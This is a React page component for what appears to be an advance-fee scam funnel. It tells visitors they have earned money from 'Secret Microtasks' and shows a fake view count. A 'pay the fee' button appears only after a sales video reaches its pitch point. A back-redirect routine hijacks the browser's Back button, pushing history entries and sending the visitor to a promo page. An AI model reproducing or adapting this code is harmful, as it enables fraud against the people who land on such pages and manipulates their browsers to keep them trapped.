import Logo from "@/components/logo";
import Button from "@/components/button";
import Balance from "@/components/balance";
import Comments from "@/components/comments";
import VSLBlackAmz from "@/components/videos/vsl-black-amz";
import { useLayer } from '@/context/layer-provider';
import { useEffect, useState } from 'react';
import { CheckCheck, Loader2 } from 'lucide-react';


export default function Page() {

  // COMPONENT STATES
  const [visible, setVisible] = useState<boolean>(false);


  // IMPORT CONTEXT DATA
  const { host, active, frontLink, params } = useLayer();

  // SET CONTENT DATA
  const VSL = VSLBlackAmz;
  const videoId = "68b0ddfc19546f43f5842586";
  const backLink = `https://${host}/promo`;
  const pitchTime = 797;

  // VIDEO VERIFY
  useEffect(() => {
    if (!visible) {
      const intervalId = setInterval(() => {
        const storedVideoTime = Number(localStorage.getItem(videoId + '-resume'));
        if (storedVideoTime > pitchTime) {
          setVisible(true);
        };
      }, 1000);
      return () => clearInterval(intervalId);
    };
  }, [videoId, visible]);

  // BACK REDIRECT
  useEffect(() => {
    function setBackRedirect(url: string) {
      let urlBackRedirect = url;
      urlBackRedirect =
        urlBackRedirect.trim() +
        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
        document.location.search.replace('?', '').toString();
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      window.addEventListener('popstate', () => {
        console.log('onpopstate', urlBackRedirect);
        setTimeout(() => {
          location.href = urlBackRedirect;
        }, 1);
      });
    };

    setBackRedirect(backLink);
  }, [backLink]);

  return (
    <div className="flex flex-col gap-5 sm:gap-6 appear">
      <div className="flex justify-between items-center">
        <Logo
          width={140}
          height={70}
        />
        <Balance />
      </div>
      <div className="flex flex-col rounded-2xl border shadow-lg gap-4 p-3 sm:p-4 bg-white border-gray-400/20 shadow-black/10">
        <VSL />
        <div className="flex flex-col gap-1.5 rounded-lg p-3 bg-gray-100/50">
          <span className="font-semibold tracking-tight">
            <span className="font-bold text-red-600">Secret Microtasks: </span>
            Did you earn money reviewing products? To withdraw your earnings and submit new reviews, watch this 4-minute tutorial.
          </span>
          <span className="text-sm tracking-tight opacity-60">
            2.7M views • 7 days ago
          </span>
          {visible && (
            <div className="block mx-auto my-8">
              <Button
                onClick={() => {
                  window.location.href = frontLink;
                }}
                disabled={active}
                className="pulse p-5 !bg-gradient-to-b !from-green-500 !to-green-600 hover:!from-green-400 hover:!to-green-500"
              >
                {active ? (
                  <Loader2 className="size-5 animate-spin" />
                ) : (
                  <CheckCheck className="size-5" />
                )}
                <span className="text-sm">
                  I WANT TO PAY THE FEE!
                </span>
              </Button>
            </div>
          )}
        </div>
      </div>
      <Comments />

    </div>
  );

};